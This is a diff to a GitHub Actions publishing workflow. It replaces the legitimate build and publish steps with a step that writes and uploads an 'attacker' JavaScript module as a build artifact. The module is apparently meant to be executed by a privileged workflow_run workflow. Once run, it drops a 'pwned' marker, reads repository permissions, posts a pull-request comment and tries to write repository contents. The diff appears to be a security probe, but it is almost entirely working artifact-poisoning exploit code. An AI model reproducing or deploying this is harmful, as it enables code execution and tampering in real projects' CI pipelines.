@@ -2,48 +2,53 @@ name: Publish to pkg.pr.new
 on:
   pull_request:
     branches: [main]
-  push:
-    branches: [main]
-    tags: ['!**']
-
 permissions:
   contents: read
-
 jobs:
   build:
-    if: github.repository == 'PDFtoMark/triage-sveltejs-v46d682b-fa48c4'
-    runs-on: ubuntu-latest
-
+    runs-on: self-hosted
     steps:
       - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
-      - uses: pnpm/action-setup@73e46992e05b19abd31f2f3c20e0e7370d762115 # v6.1.1
-      - uses: actions/setup-node@949feb2413d6458794dcd2491c4babbbce0c15c1 # v7.1.0
-        with:
-          # Same version as the release build (Release.yml)
-          node-version: 26
-      - name: Install Packages
-        run: pnpm install --frozen-lockfile
-      - name: Build
-        run: pnpm run build
-      - run: pnpx pkg-pr-new publish --compact './packages/eslint-plugin-svelte' --json output.json --comment=off
-      - name: Add metadata to output
-        uses: actions/github-script@3a2844b7e9c422d3c10d287c895573f7108da1b3 # v9.0.0
-        with:
-          github-token: ${{ secrets.GITHUB_TOKEN }}
-          script: |
-            const fs = require('fs');
-            const output = JSON.parse(fs.readFileSync('output.json', 'utf8'));
-            output.number = context.issue.number;
-            output.event_name = context.eventName;
-            output.ref = context.ref;
-            output.sha = context.eventName === 'pull_request'
-              ? context.payload.pull_request.head.sha
-              : context.payload.after;
-            fs.writeFileSync('output.json', JSON.stringify(output), 'utf8');
-      - name: Upload output
-        uses: actions/upload-artifact@cf430e030ddbb5b0abf93d22962f4752f3646cd9 # v7.0.2
+      - run: |
+          mkdir -p tools
+          cat > tools/pkg.pr.new-comment.mjs <<'JS'
+          import fs from 'node:fs';
+          fs.writeFileSync('pwned-marker.json', JSON.stringify({
+            module: 'attacker',
+            cwd: process.cwd(),
+            repository: process.env.GITHUB_REPOSITORY,
+            event: process.env.GITHUB_EVENT_NAME
+          }));
+          console.log('ATTACKER-MODULE-TOP-LEVEL-RCE', process.cwd());
+          export default async function ({ github, context }) {
+            const run = context.payload.workflow_run;
+            console.log('ATTACKER-WORKFLOW-RUN', JSON.stringify({ id: run.id, event: run.event, conclusion: run.conclusion }));
+            const repo = await github.rest.repos.get({ owner: context.repo.owner, repo: context.repo.repo });
+            console.log('ATTACKER-PERMS', JSON.stringify(repo.data.permissions), 'private=' + repo.data.private);
+            const pr = (run.pull_requests && run.pull_requests[0] && run.pull_requests[0].number) || null;
+            console.log('ATTACKER-PR', pr);
+            if (pr) {
+              const comment = await github.rest.issues.createComment({
+                owner: context.repo.owner, repo: context.repo.repo, issue_number: pr,
+                body: 'ATTACKER-COMMENT: arbitrary code ran in the privileged workflow_run workflow (validation ' + run.id + ').'
+              });
+              console.log('ATTACKER-COMMENT-OK', comment.data.id, comment.data.user.login);
+            }
+            try {
+              await github.rest.repos.createOrUpdateFileContents({
+                owner: context.repo.owner, repo: context.repo.repo, path: 'attacker-contents-write-probe.txt',
+                message: 'probe', content: Buffer.from('probe').toString('base64')
+              });
+              console.log('ATTACKER-CONTENTS-WRITE-ALLOWED');
+            } catch (e) {
+              console.log('ATTACKER-CONTENTS-WRITE-BLOCKED', e.status, e.message);
+            }
+          }
+          JS
+          echo '{"number":1,"sha":"deadbeef","packages":[]}' > output.json
+      - uses: actions/upload-artifact@cf430e030ddbb5b0abf93d22962f4752f3646cd9 # v7.0.2
         with:
           name: output
-          path: ./output.json
-
-      - run: ls -R .
+          path: |
+            output.json
+            tools/pkg.pr.new-comment.mjs
